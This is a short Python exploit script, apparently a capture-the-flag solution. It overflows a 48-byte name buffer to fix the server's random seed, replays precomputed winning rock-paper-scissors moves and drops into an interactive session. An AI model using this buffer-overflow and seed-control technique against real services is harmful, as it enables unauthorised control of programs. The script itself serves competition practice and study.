from socket import *
from struct import *
import telnetlib
import time
import sys

host = 'milkyway.chal.mmactf.link'
port = 1641

s = socket( AF_INET, SOCK_STREAM )
s.connect((host,port))

# buffer size: 48
name = "A"*48
name+= "A"*4     # srand(0x41414141)
s.send(name+"\n")

# We know computer's random seed, so we can win every game!
# computer's rand get from below code
'''
#include <stdio.h>
#include <stdlib.h>

int main()
{
        srand(0x41414141);
        int i=0;
        for(i=0; i<50; i++){
                printf("%d,",rand()%3);
        }
        puts("");
}
'''
rsp = [2,2,1,0,1,2,0,2,2,0,1,1,2,1,0,0,0,1,0,2,2,2,0,2,0,1,1,2,0,1,1,2,0,0,1,0,0,1,0,2,2,1,0,2,1,1,0,1,0,1]

for rsp_entry in rsp:

        # rock -> 0
        # paper -> 1
        # scissors -> 2

        # Rock, we have to send Paper
        if rsp_entry == 0:
                s.send("P\n")

        # Paper
        elif rsp_entry == 1:
                s.send("S\n")

        # Scissors
        elif rsp_entry == 2:
                s.send("R\n")

try:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        t.close()
except KeyboardInterrupt:
        pass
